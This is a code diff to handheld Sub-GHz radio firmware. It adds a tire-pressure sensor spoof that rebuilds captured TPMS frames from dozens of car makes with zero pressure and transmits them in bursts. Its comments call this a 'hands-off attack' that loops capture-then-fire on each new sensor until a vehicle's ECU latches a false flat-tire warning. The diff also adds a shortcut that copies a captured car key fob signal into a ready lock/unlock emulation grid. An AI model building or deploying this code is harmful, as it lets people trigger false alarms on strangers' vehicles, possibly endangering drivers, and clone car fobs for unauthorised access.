@@ -1,4 +1,7 @@
 #include "../subghz_i.h"
+#include "../helpers/subghz_fob_buttons.h"
+#include <flipper_format/flipper_format_i.h>
+#include <toolbox/stream/stream.h>
 #ifndef PUBLIC_BUILD
 #include "../helpers/tpms_watch.h"
 #endif
@@ -8,6 +11,45 @@
 #include "applications/main/subghz/helpers/subghz_txrx_i.h"
 #include <lib/subghz/blocks/generic.h>
 #include <lib/subghz/protocols/psa.h>
+#include <lib/subghz/protocols/schrader_gg4.h>
+#ifndef PUBLIC_BUILD
+#include <lib/subghz/protocols/tpms_ford.h>
+#include <lib/subghz/protocols/tpms_renault.h>
+#include <lib/subghz/protocols/tpms_citroen.h>
+#include <lib/subghz/protocols/tpms_pmv107j.h>
+#include <lib/subghz/protocols/tpms_jeep.h>
+#include <lib/subghz/protocols/tpms_hyundai_vdo.h>
+#include <lib/subghz/protocols/tpms_abarth124.h>
+#include <lib/subghz/protocols/tpms_toyota.h>
+#include <lib/subghz/protocols/tpms_porsche.h>
+#include <lib/subghz/protocols/tpms_bmw_g3.h>
+#include <lib/subghz/protocols/tpms_honda.h>
+#include <lib/subghz/protocols/tpms_bmw.h>
+#include <lib/subghz/protocols/tpms_truck.h>
+#include <lib/subghz/protocols/tpms_nissan.h>
+#include <lib/subghz/protocols/tpms_jansite.h>
+#include <lib/subghz/protocols/schrader_eg53ma4.h>
+#include <lib/subghz/protocols/tpms_elantra2012.h>
+#include <lib/subghz/protocols/tpms_ave.h>
+#include <lib/subghz/protocols/tpms_renault_0435r.h>
+#include <lib/subghz/protocols/tpms_kia.h>
+#include <lib/subghz/protocols/tpms_trw_fsk.h>
+#include <lib/subghz/protocols/tpms_smartire.h>
+#include <lib/subghz/protocols/tpms_jansite_ty468.h>
+#include <lib/subghz/protocols/tpms_jansite_ty588.h>
+#include <lib/subghz/protocols/tpms_mercedes_benz.h>
+#include <lib/subghz/protocols/tpms_airpuxem.h>
+#include <lib/subghz/protocols/tpms_tyreguard400.h>
+#include <lib/subghz/protocols/tpms_gm.h>
+#include <lib/subghz/protocols/tpms_eezrv.h>
+#include <lib/subghz/protocols/tpms_trw_ook.h>
+#include <lib/subghz/protocols/tpms_schrader_motorcycle.h>
+#include <lib/subghz/protocols/tpms_imars_t240.h>
+#include <lib/subghz/protocols/tpms_sefis_m3.h>
+#include <lib/subghz/protocols/tpms_schraeder.h>
+#include <lib/subghz/protocols/schrader_smd3ma4.h>
+#include <lib/subghz/protocols/schrader_nis315g3.h>
+#endif
 #include <string.h>
 
 #define TAG "SubGhzSceneReceiverInfo"
@@ -134,7 +176,177 @@ static void
 #endif
         break;
     }
+    case SubGhzViewTpmsInfoActionZeroPsiToggle:
+        view_dispatcher_send_custom_event(
+            subghz->view_dispatcher, SubGhzCustomEventTpmsZeroPsiToggle);
+        break;
     }
+}
+
+// TRUE only for the TPMS protocols that have BOTH a working encoder and a 0-PSI
+// packer below — i.e. the ones the flat-tire spoof can actually transmit. The
+// auto-fire arm gate (subghz_scene_receiver.c) uses this so a TPMS frame that
+// only decodes under a non-transmittable protocol never routes into a TX that
+// would fail with "Error in protocol parameters".
+bool subghz_scene_receiver_info_tpms_is_packable(const char* pname) {
+    if(!pname) return false;
+    if(strcmp(pname, TPMS_PROTOCOL_SCHRADER_GG4_NAME) == 0) return true;
+#ifndef PUBLIC_BUILD
+    if(strcmp(pname, TPMS_PROTOCOL_FORD_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_RENAULT_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_CITROEN_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_PMV107J_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_JEEP_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_HYUNDAI_VDO_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_ABARTH124_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_TOYOTA_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_PORSCHE_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_BMW_G3_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_HONDA_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_BMW_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_TRUCK_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_NISSAN_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_JANSITE_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_SCHRADER_EG53MA4_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_ELANTRA2012_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_AVE_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_RENAULT_0435R_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_KIA_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_TRW_FSK_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_SMARTIRE_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_JANSITE_TY468_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_JANSITE_TY588_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_MERCEDES_BENZ_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_AIRPUXEM_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_TYREGUARD400_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_GM_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_EEZRV_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_TRW_OOK_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_SCHRADER_MOTO_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_IMARS_T240_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_SEFIS_M3_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_SCHRAEDER_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_SCHRADER_SMD3MA4_NAME) == 0) return true;
+    if(strcmp(pname, TPMS_PROTOCOL_SCHRADER_NIS315G3_NAME) == 0) return true;
+#endif
+    return false;
+}
+
+// Re-encode the edited TPMS frame with the correct per-protocol packer (mirrors
+// subghz_scene_tpms_edit_repack) so a modified 0-PSI value is actually transmitted.
+static void subghz_scene_receiver_info_tpms_repack(const char* pname, TPMSBlockGeneric* g) {
+    if(!pname) return;
+    if(strcmp(pname, TPMS_PROTOCOL_SCHRADER_GG4_NAME) == 0) {
+        tpms_protocol_schrader_gg4_pack(g);
+    }
+#ifndef PUBLIC_BUILD
+    else if(strcmp(pname, TPMS_PROTOCOL_FORD_NAME) == 0) {
+        tpms_protocol_ford_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_RENAULT_NAME) == 0) {
+        tpms_protocol_renault_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_CITROEN_NAME) == 0) {
+        tpms_protocol_citroen_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_PMV107J_NAME) == 0) {
+        tpms_protocol_pmv107j_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_JEEP_NAME) == 0) {
+        tpms_protocol_jeep_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_HYUNDAI_VDO_NAME) == 0) {
+        tpms_protocol_hyundai_vdo_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_ABARTH124_NAME) == 0) {
+        tpms_protocol_abarth124_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_TOYOTA_NAME) == 0) {
+        tpms_protocol_toyota_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_PORSCHE_NAME) == 0) {
+        tpms_protocol_porsche_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_BMW_G3_NAME) == 0) {
+        tpms_protocol_bmw_g3_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_HONDA_NAME) == 0) {
+        tpms_protocol_honda_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_BMW_NAME) == 0) {
+        tpms_protocol_bmw_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_TRUCK_NAME) == 0) {
+        tpms_protocol_truck_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_NISSAN_NAME) == 0) {
+        tpms_protocol_nissan_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_JANSITE_NAME) == 0) {
+        tpms_protocol_jansite_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_SCHRADER_EG53MA4_NAME) == 0) {
+        tpms_protocol_schrader_eg53ma4_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_ELANTRA2012_NAME) == 0) {
+        tpms_protocol_tpms_elantra2012_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_AVE_NAME) == 0) {
+        tpms_protocol_tpms_ave_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_RENAULT_0435R_NAME) == 0) {
+        tpms_protocol_tpms_renault_0435r_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_KIA_NAME) == 0) {
+        tpms_protocol_tpms_kia_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_TRW_FSK_NAME) == 0) {
+        tpms_protocol_tpms_trw_fsk_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_SMARTIRE_NAME) == 0) {
+        tpms_protocol_tpms_smartire_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_JANSITE_TY468_NAME) == 0) {
+        tpms_protocol_tpms_jansite_ty468_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_JANSITE_TY588_NAME) == 0) {
+        tpms_protocol_tpms_jansite_ty588_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_MERCEDES_BENZ_NAME) == 0) {
+        tpms_protocol_tpms_mercedes_benz_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_AIRPUXEM_NAME) == 0) {
+        tpms_protocol_tpms_airpuxem_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_TYREGUARD400_NAME) == 0) {
+        tpms_protocol_tpms_tyreguard400_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_GM_NAME) == 0) {
+        tpms_protocol_tpms_gm_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_EEZRV_NAME) == 0) {
+        tpms_protocol_tpms_eezrv_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_TRW_OOK_NAME) == 0) {
+        tpms_protocol_tpms_trw_ook_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_SCHRADER_MOTO_NAME) == 0) {
+        tpms_protocol_tpms_schrader_motorcycle_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_IMARS_T240_NAME) == 0) {
+        tpms_protocol_tpms_imars_t240_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_SEFIS_M3_NAME) == 0) {
+        tpms_protocol_tpms_sefis_m3_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_SCHRAEDER_NAME) == 0) {
+        tpms_protocol_tpms_schraeder_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_SCHRADER_SMD3MA4_NAME) == 0) {
+        tpms_protocol_schrader_smd3ma4_pack(g);
+    } else if(strcmp(pname, TPMS_PROTOCOL_SCHRADER_NIS315G3_NAME) == 0) {
+        tpms_protocol_schrader_nis315g3_pack(g);
+    }
+#endif
+}
+
+// Build a 0-bar (flat-tire) frame from the picked-up sensor into a NEW throwaway
+// FlipperFormat WITHOUT touching the history item — the original capture stays
+// intact so it can still be Saved to a .sub for later replay. tx_start only needs
+// the FFF during its deserialize (the encoder then yields from its own buffer), so
+// the caller frees it right after. Returns NULL if the protocol is unpackable.
+static FlipperFormat* subghz_scene_receiver_info_tpms_build_zero_psi(SubGhz* subghz) {
+    TPMSBlockGeneric generic = {0};
+    const char* pname =
+        subghz_history_get_protocol_name(subghz->history, subghz->idx_menu_chosen);
+    generic.protocol_name = pname;
+    FlipperFormat* orig = subghz_history_get_raw_data(subghz->history, subghz->idx_menu_chosen);
+    if(!orig || tpms_block_generic_deserialize(&generic, orig) != SubGhzProtocolStatusOk) {
+        return NULL;
+    }
+    generic.protocol_name = pname;
+    generic.pressure = 0.0f;
+    subghz_scene_receiver_info_tpms_repack(pname, &generic);
+
+    FlipperFormat* fff = flipper_format_string_alloc();
+    SubGhzRadioPreset preset = subghz_txrx_get_preset(subghz->txrx);
+    if(tpms_block_generic_serialize(&generic, fff, &preset) != SubGhzProtocolStatusOk) {
+        flipper_format_free(fff);
+        return NULL;
+    }
+    // Burst length for the auto-cycle (endless_tx=false) 0-PSI fire: the encoders
+    // read "Repeat" and yield that many frames (~1s) before returning to the scan —
+    // enough for a real ECU to latch, and long enough to catch on a single SDR.
+    // Ignored by the manual hold-Left path (endless_tx=true loops until released).
+    uint32_t repeat = 100;
+    flipper_format_write_uint32(fff, "Repeat", &repeat, 1);
+    return fff;
 }
 
 // Toggle TPMS_NO_BATT → 0 (ok) → 1 (low) → TPMS_NO_BATT and persist into the
@@ -199,6 +411,21 @@ static bool subghz_scene_receiver_info_try_tpms(SubGhz* subghz) {
     return true;
 }
 
+// True when the selected decoded signal is a fully-cloneable car fob that the
+// multi-button emulate grid supports (has a Lock/Unlock table or a single-button
+// synth) — used to offer the "Fob" dpad shortcut straight to the ready fob.
+static bool subghz_scene_receiver_info_is_fob_cloneable(SubGhz* subghz) {
+#ifndef PUBLIC_BUILD
+    SubGhzProtocolDecoderBase* d = subghz_txrx_get_decoder(subghz->txrx);
+    if(!d || !d->protocol || !d->protocol->name) return false;
+    const char* p = d->protocol->name;
+    return subghz_fob_protocol_supported(p) || subghz_fob_single_button_synth(p);
+#else
+    (void)subghz;
+    return false;
+#endif
+}
+
 void subghz_scene_receiver_info_draw_widget(SubGhz* subghz) {
     if(subghz_scene_receiver_info_update_parser(subghz)) {
         if(subghz_scene_receiver_info_try_tpms(subghz)) {
@@ -259,10 +486,15 @@ void subghz_scene_receiver_info_draw_widget(SubGhz* subghz) {
         // the hub on the Left slot means those spokes stay reachable for every
         // supported (always-dynamic) protocol.
         if(subghz_scene_receiver_info_is_dynamic(subghz)) {
+            // Fully-cloneable fobs get a one-key "Fob" shortcut (dpad = Left arrow on
+            // Cardputer / tilt-Left on M5Stick) straight to the ready lock/unlock grid;
+            // everything else keeps the Signal-ID hub ("ID").
+            const char* left_label =
+                subghz_scene_receiver_info_is_fob_cloneable(subghz) ? "Fob" : "ID";
             widget_add_button_element(
                 subghz->widget,
                 GuiButtonTypeLeft,
-                "ID",
+                left_label,
                 subghz_scene_receiver_info_callback,
                 subghz);
         }
@@ -300,12 +532,23 @@ void subghz_scene_receiver_info_on_enter(void* context) {
     SubGhz* subghz = context;
 
     subghz_custom_btns_reset();
+    subghz->tpms_zero_psi_firing = false;
 
     subghz_scene_receiver_info_draw_widget(subghz);
 
     if(!subghz_history_get_text_space_left(subghz->history, NULL) &&
        !scene_manager_has_previous_scene(subghz->scene_manager, SubGhzSceneDecodeRAW)) {
         subghz->state_notifications = SubGhzNotificationStateRx;
+    }
+
+    // Auto-fire 0-PSI: arrived from the spoofer scan's hands-off attack. Queue the
+    // 0-PSI toggle so on_event starts the flat-tire spoof now that the (TPMS) view
+    // is up. No-op for non-transmittable sensors (the toggle handler falls back).
+    if(subghz->tpms_auto_fire_on_open) {
+        subghz->tpms_auto_fire_on_open = false;
+        subghz->tpms_auto_cycle = true; // burst then return to the scan (capture->fire loop)
+        view_dispatcher_send_custom_event(
+            subghz->view_dispatcher, SubGhzCustomEventTpmsZeroPsiToggle);
     }
 }
 
@@ -343,6 +586,13 @@ bool subghz_scene_receiver_info_on_event(void* context, SceneManagerEvent event)
 
             return true;
         } else if(event.event == SubGhzCustomEventSceneReceiverInfoSave) {
+            // If the 0-PSI spoof is firing, stop it cleanly first so we can save the
+            // ORIGINAL captured sensor (the history item was never modified).
+            if(subghz->tpms_zero_psi_firing) {
+                subghz_block_generic_global.endless_tx = false;
+                subghz->tpms_zero_psi_firing = false;
+                subghz_view_tpms_info_set_zero_psi_firing(subghz->subghz_tpms_info, false);
+            }
             //CC1101 Stop RX -> Save
             subghz->state_notifications = SubGhzNotificationStateIDLE;
             subghz_txrx_hopper_set_state(subghz->txrx, SubGhzHopperStateOFF);
@@ -362,8 +612,44 @@ bool subghz_scene_receiver_info_on_event(void* context, SceneManagerEvent event)
             }
             return true;
         } else if(event.event == SubGhzCustomEventSceneReceiverInfoAnalyze) {
+#ifndef PUBLIC_BUILD
+            const bool _fob_quick = subghz_scene_receiver_info_is_fob_cloneable(subghz);
+#endif
             // Route to the Signal-ID hub; it identifies the fob (make/model/action)
             // and offers the deeper rolling / PSA tool as a "Details" spoke.
+            // Stop RX first (mirrors the Save/TpmsEdit spokes) so the ~8K lazy RX worker is
+            // freed before the Analyze spokes (PSA brute / rollback replay) spawn their own
+            // internal worker stack — otherwise that alloc OOMs -> reboot on this maxed board.
+            subghz->state_notifications = SubGhzNotificationStateIDLE;
+            subghz_txrx_hopper_set_state(subghz->txrx, SubGhzHopperStateOFF);
+            subghz_txrx_stop(subghz->txrx);
+#ifndef PUBLIC_BUILD
+            // dpad "Fob" shortcut: for a fully-cloneable car fob, skip the Signal-ID
+            // hub and jump straight to the ready lock/unlock emulate grid.
+            if(_fob_quick) {
+                SubGhzRadioPreset* rp =
+                    subghz_history_get_radio_preset(subghz->history, subghz->idx_menu_chosen);
+                if(rp) {
+                    subghz_txrx_set_preset(
+                        subghz->txrx,
+                        furi_string_get_cstr(rp->name),
+                        rp->frequency,
+                        rp->data,
+                        rp->data_size);
+                }
+                Stream* dst =
+                    flipper_format_get_raw_stream(subghz_txrx_get_fff_data(subghz->txrx));
+                Stream* src = flipper_format_get_raw_stream(
+                    subghz_history_get_raw_data(subghz->history, subghz->idx_menu_chosen));
+                stream_clean(dst);
+                stream_rewind(src);
+                stream_copy_full(src, dst);
+                subghz->keeloq_fob_from_garage = true;
+                subghz->keeloq_fob_generic = true;
+                scene_manager_next_scene(subghz->scene_manager, SubGhzSceneKeeloqFob);
+                return true;
+            }
+#endif
             scene_manager_next_scene(subghz->scene_manager, SubGhzSceneAnalyze);
             return true;
         } else if(
@@ -382,6 +668,69 @@ bool subghz_scene_receiver_info_on_event(void* context, SceneManagerEvent event)
             // Re-load the TPMS view from the now-modified history payload
             subghz_scene_receiver_info_update_parser(subghz);
             subghz_scene_receiver_info_try_tpms(subghz);
+            return true;
+        } else if(event.event == SubGhzCustomEventTpmsZeroPsiToggle) {
+            if(!subghz->tpms_zero_psi_firing) {
+                // START: build a 0-bar flat-tire frame from the capture WITHOUT
+                // modifying the history item (so it stays saveable via Save), then
+                // transmit it. Auto-cycle mode fires a finite BURST (endless_tx=false
+                // -> N repeats) and the TxWait tick returns to the scan to capture the
+                // next sensor; the manual hold-Left path fires endlessly until toggled
+                // off. The screen shows the real captured values behind the banner.
+                FlipperFormat* zfff = subghz_scene_receiver_info_tpms_build_zero_psi(subghz);
+                if(!zfff) {
+                    // Nothing to fire -> in auto-cycle, go back to capturing.
+                    if(subghz->tpms_auto_cycle) {
+                        subghz->tpms_auto_cycle = false;
+                        scene_manager_search_and_switch_to_previous_scene(
+                            subghz->scene_manager, SubGhzSceneReceiver);
+                    } else {
+                        notification_message(subghz->notifications, &sequence_error);
+                    }
+                    return true;
+                }
+                subghz_txrx_hopper_pause(subghz->txrx);
+                subghz_block_generic_global.endless_tx = subghz->tpms_auto_cycle ? false : true;
+                if(subghz_tx_start(subghz, zfff)) {
+                    subghz->tpms_zero_psi_firing = true;
+                    subghz_view_tpms_info_set_zero_psi_firing(subghz->subghz_tpms_info, true);
+#ifndef PUBLIC_BUILD
+                    if(subghz->tpms_auto_cycle) {
+                        // Auto-fired: tick this sensor's list row and stop re-firing /
+                        // re-listing it for the rest of this scan session.
+                        subghz_history_set_fired(
+                            subghz->history, subghz->idx_menu_chosen, true);
+                        subghz_tpms_fired_add(subghz, subghz->tpms_auto_fire_sensor_id);
+                    }
+#endif
+                    // Auto-cycle: TxWait watches for the burst to finish, then returns
+                    // to the scan. Manual: stay firing (Tx) until the user stops.
+                    subghz->state_notifications = subghz->tpms_auto_cycle ?
+                                                      SubGhzNotificationStateTxWait :
+                                                      SubGhzNotificationStateTx;
+                } else {
+                    // TX failed -> in auto-cycle go back to capturing, else fall to RX.
+                    subghz_block_generic_global.endless_tx = false;
+                    if(subghz->tpms_auto_cycle) {
+                        subghz->tpms_auto_cycle = false;
+                        flipper_format_free(zfff);
+                        scene_manager_search_and_switch_to_previous_scene(
+                            subghz->scene_manager, SubGhzSceneReceiver);
+                        return true;
+                    }
+                    subghz_txrx_rx_start(subghz->txrx);
+                    subghz_txrx_hopper_unpause(subghz->txrx);
+                    subghz->state_notifications = SubGhzNotificationStateRx;
+                    notification_message(subghz->notifications, &sequence_error);
+                }
+                flipper_format_free(zfff);
+            } else {
+                // STOP: end endless TX; the TxWait tick path stops TX + restarts RX.
+                subghz_block_generic_global.endless_tx = false;
+                subghz->tpms_zero_psi_firing = false;
+                subghz_view_tpms_info_set_zero_psi_firing(subghz->subghz_tpms_info, false);
+                subghz->state_notifications = SubGhzNotificationStateTxWait;
+            }
             return true;
         }
     } else if(event.type == SceneManagerEventTypeTick) {
@@ -405,6 +754,20 @@ bool subghz_scene_receiver_info_on_event(void* context, SceneManagerEvent event)
                 notification_message(subghz->notifications, &sequence_blink_magenta_10);
             } else {
                 subghz_txrx_stop(subghz->txrx);
+
+                // Auto-cycle: the 0-PSI burst finished -> clear firing and go BACK to
+                // the scan to capture the next sensor (capture->fire->capture loop,
+                // until the user leaves the scan).
+                if(subghz->tpms_auto_cycle) {
+                    subghz->tpms_auto_cycle = false;
+                    subghz->tpms_zero_psi_firing = false;
+                    subghz_view_tpms_info_set_zero_psi_firing(subghz->subghz_tpms_info, false);
+                    subghz->state_notifications = SubGhzNotificationStateIDLE;
+                    scene_manager_search_and_switch_to_previous_scene(
+                        subghz->scene_manager, SubGhzSceneReceiver);
+                    break;
+                }
+
                 // update screen
                 widget_reset(subghz->widget);
                 subghz_scene_receiver_info_draw_widget(subghz);
@@ -429,6 +792,29 @@ bool subghz_scene_receiver_info_on_event(void* context, SceneManagerEvent event)
 
 void subghz_scene_receiver_info_on_exit(void* context) {
     SubGhz* subghz = context;
+
+    // Stop the continuous 0-PSI spoof if the user left the screen while it fired.
+    if(subghz->tpms_zero_psi_firing) {
+        subghz_block_generic_global.endless_tx = false;
+        // Let the in-flight async frame finish before tearing down, so the radio is
+        // left idle-clean; a hard stop mid-frame could leave the async TX engine busy
+        // and make the NEXT auto-fire's tx_start fail on a return-to-scan re-attack.
+        uint32_t guard = 0;
+        while(!subghz_devices_is_async_complete_tx(subghz->txrx->radio_device) &&
+              guard++ < 200) {
+            furi_delay_ms(1);
+        }
+        subghz_txrx_stop(subghz->txrx);
+        subghz->tpms_zero_psi_firing = false;
+        subghz_view_tpms_info_set_zero_psi_firing(subghz->subghz_tpms_info, false);
+    }
+
+    // Belt-and-suspenders: clear the auto-fire arm/route flags on the way out so a
+    // return to the SAME scan session always re-arms cleanly (the scan on_enter also
+    // resets these, but do it here too in case of any resume path).
+    subghz->tpms_auto_fire_pending = false;
+    subghz->tpms_auto_fire_on_open = false;
+    subghz->tpms_auto_cycle = false;
 
     widget_reset(subghz->widget);
     subghz_txrx_reset_dynamic_and_custom_btns(subghz->txrx);
